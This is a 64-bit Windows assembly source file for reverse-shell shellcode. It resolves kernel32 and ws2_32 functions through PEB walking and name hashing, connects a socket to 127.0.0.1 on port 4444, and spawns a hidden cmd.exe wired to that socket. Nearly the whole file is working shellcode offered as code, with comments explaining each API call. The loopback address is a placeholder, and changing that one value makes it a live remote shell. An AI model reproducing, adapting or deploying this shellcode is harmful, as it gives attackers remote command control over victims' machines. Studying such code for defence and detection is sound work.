BITS 64

        CLD
        AND     RSP,    0xFFFFFFFFFFFFFFF0
        MOV     RAX,    0x7369746E656C6973
        PUSH    RAX

GET_KERNEL32:
        MOV     RAX,    GS:[0x60]
        MOV     RAX,    [RAX + 0x18]
        MOV     RAX,    [RAX + 0x30]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX]
        MOV     RAX,    [RAX + 0x10]
        PUSH    RAX

        SUB     RSP,    0x40
        MOV     RBP,    RSP
        
GET_CREATEPROCESSA:
        MOV     RCX,    QWORD   [RBP + 0x40]
        MOV     RDX,    0x6BA6BCC9
        CALL    FIND_FUNCTION
        
        MOV     QWORD   [RBP + 0x28],   RAX

GET_EXITPROCESS:
        MOV     RCX,    QWORD   [RBP + 0x40]
        MOV     RDX,    0x4FD18963
        CALL    FIND_FUNCTION
        
        MOV     QWORD   [RBP + 0x20],   RAX

GET_LOADLIBRARYA:
        MOV     RCX,    QWORD   [RBP + 0x40]
        MOV     RDX,    0xC917432
        CALL    FIND_FUNCTION
        
        MOV     QWORD   [RBP + 0x18],   RAX

LOAD_WS232:
        CALL    CLEAN

        PUSH    0x006C6C
        MOV     RAX,    0x642E32335F327377
        PUSH    RAX
        MOV     RCX,    RSP
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00

        MOV     R10,    QWORD   [RBP + 0x18]
        CALL    SET_FUNCTION
        CALL    RUN_FUNCTION

        ADD     RSP,    0x30
        MOV     QWORD   [RBP + 0x38],   RAX
        
GET_WSASTARTUP:
        MOV     RCX,    QWORD   [RBP + 0x38]
        MOV     RDX,    0x80B46A3D
        CALL    FIND_FUNCTION

        MOV     QWORD   [RBP + 0x10],   RAX

GET_WSASOCKETA:
        MOV     RCX,    QWORD   [RBP + 0x38]
        MOV     RDX,    0xDE78322D
        CALL    FIND_FUNCTION
        
        MOV     QWORD   [RBP + 0x08],   RAX

GET_CONNECT:
        MOV     RCX,    QWORD   [RBP + 0x38]
        MOV     RDX,    0xC0577762
        CALL    FIND_FUNCTION
        
        MOV     QWORD   [RBP + 0x00],   RAX

; Windows ABI follows a standard calling convention.
;
; RCX                   => 1st parameter
; RDX                   => 2nd parameter
; R8                    => 3rd parameter
; R9                    => 4th parameter
; [RSP + 0x20]          => 5th parameter
; [RSP + 0x28]          => 6th parameter
; ...
; [RSP + 0x00 .. 0x018] Belong to the functions
; being called. This stack space is used to save
; any arguments that as may need be.

FUNCTIONS:

; WSAStartup calls for 2 parameters.
;
; RCX                   => Version requested.
; RDX                   => Pointer to WSAData.
;
; WSAData is a 400 byte structure. It 
; is not required to be zeroed out.

RUN_WSASTARTUP:
        CALL    CLEAN

        MOV     RCX,    0x0202
        SUB     RSP,    0x190
        MOV     RDX,    RSP
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        
        MOV     R10,    QWORD   [RBP + 0x10]
        CALL    SET_FUNCTION
        CALL    RUN_FUNCTION

        ADD     RSP,    0x1B0

; WSASocketA calls for 6 parameters.
; 
; RCX                   => Address family.
; RDX                   => Type.
; R8                    => Protocol.
; R9                    => Pointer to protocol info.
; [RSP + 0x20]          => Group.
; [RSP + 0x28]          => Flags.
; 
; Protocol Info may be 0. Group may be 0.
; Flags may be 0.
; 
; WSASocketA returns a handle to a valid
; socket opened by the OS.

RUN_WSASOCKETA:
        CALL    CLEAN

        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        MOV     RCX,    0x02
        MOV     RDX,    0x01
        MOV     R8,     0x06
        
        MOV     R10,    QWORD   [RBP + 0x08]
        CALL    SET_FUNCTION
        CALL    RUN_FUNCTION

        ADD     RSP,    0x30
        PUSH    RAX

; connect calls for 3 arguments.
;
; RCX                  => Socket handle.
; RDX                  => Socket address.
; R8                   => Size of socket address.
; R8                   => Size of socket address.
;
; Socket address is a 16 byte structure
; consisting of address, port, and family.
; This structure also has 8 bytes of padding.

RUN_CONNECT:
        CALL    CLEAN

        PUSH    0x00
        PUSH    0x00
        MOV     RCX,    0x0100007f5c110002
        PUSH    RCX
        MOV     RCX,    RAX
        MOV     RDX,    RSP
        MOV     R8,     0x10
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        
        MOV     R10,    QWORD   [RBP + 0x00]
        CALL    SET_FUNCTION
        CALL    RUN_FUNCTION

        ADD     RSP,    0x38

; CreateProcessA calls for 10 arguments.
;
; RCX                  => Pointer to application name.
; RDX                  => Pointer to command line.
; R8                   => Pointer to process attributes.
; R9                   => Pointer to thread attributes.
; [RSP + 0x20]         => Boolean to inherit handles.
; [RSP + 0x28]         => Creation flags.
; [RSP + 0x30]         => Environment.
; [RSP + 0x38]         => Current directory.
; [RSP + 0x40]         => Startup information.
; [RSP + 0x48]         => Process information.
; 
; Inherit handles must be true for a process receiving
; different standard handles.
; 
; Startup information is a 104 byte structure that
; includes fields for standard handles and 
; startup routine.
; 
; Process information is a 16 byte structure for
; process and thread information. Is not required to

RUN_CREATEPROCESSA:
        CALL    CLEAN
        
        PUSH    0x00
        MOV     RAX,    0x006578652E646D63
        PUSH    RAX
        MOV     RDX,    RSP

        ; Startup information structure

        MOV     RAX,    QWORD   [RSP + 0x10]
        PUSH    RAX
        PUSH    RAX
        PUSH    RAX
        PUSH    0x00
        PUSH    0x00
        MOV     RAX,    0x0000010000000000
        PUSH    RAX
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x68

        ; Process information structure

        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        LEA     RAX,    QWORD   [RSP + 0x08]
        PUSH    RAX             ; [RSP + 0x48] => 10th parameter
        LEA     RAX,    QWORD   [RSP + 0x28]
        PUSH    RAX             ; [RSP + 0x40] => 9th parameter
        PUSH    0x00            ; [RSP + 0x38] => 8th parameter
        PUSH    0x00            ; [RSP + 0x30] => 7th parameter
        PUSH    0x08000000      ; [RSP + 0x28] => 6th parameter
        PUSH    0x01            ; [RSP + 0x20] => 5th parameter
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        PUSH    0x00
        
        MOV     R10,    QWORD   [RBP + 0x28]
        CALL    SET_FUNCTION
        CALL    RUN_FUNCTION

        ADD     RSP,    0xF0

RUN_EXITPROCESS:
        CALL    CLEAN

        MOV     R10,    QWORD   [RBP + 0x20]
        CALL    SET_FUNCTION
        CALL    RUN_FUNCTION

; =-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ;

FIND_FUNCTION:

PARSE_MODULE:
        MOV     R8D,    DWORD   [RCX + 0x3C]
        LEA     R8,     QWORD   [RCX + R8]
        MOV     R8D,    DWORD   [R8 + 0x88]
        LEA     R8,     QWORD   [RCX + R8]
        MOV     R9D,    DWORD   [R8 + 0x18]
        MOV     R10D,   DWORD   [R8 + 0x20]
        LEA     R10,    QWORD   [RCX + R10]

SEARCH:
        DEC     R9,
        MOV     ESI,    DWORD   [R10 + R9 * 0x04]
        LEA     RSI,    QWORD   [RCX + RSI]
        XOR     RAX,    RAX
        XOR     R11,    R11

HASH:
        LODSB
        TEST    AL,     AL
        JZ      COMPARE
        ROR     R11D,   0x07
        ADD     R11D,   EAX
        JMP     HASH

COMPARE:
        CMP     RDX,    R11
        JNZ     SEARCH
        
RETURN_FUNCTION:
        MOV     EAX,    DWORD   [R8 + 0x24]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOVZX   EDX,    WORD    [RAX + R9 * 0x02]
        MOV     EAX,    DWORD   [R8 + 0x1C]
        LEA     RAX,    QWORD   [RCX + RAX]
        MOV     EAX,    DWORD   [RAX + RDX * 0x04]
        LEA     RAX,    QWORD   [RCX + RAX]
        RET

SET_FUNCTION:
        XOR     RAX,    RAX
        MOV     QWORD   [RBP + 0x30],   RAX
        MOV     QWORD   [RBP + 0x30],   R10
        RET

RUN_FUNCTION:
        JMP     QWORD   [RBP + 0x30]

CLEAN:
        XOR     RCX,    RCX
        XOR     RDX,    RDX
        XOR     R8,     R8
        XOR     R9,     R9
        RET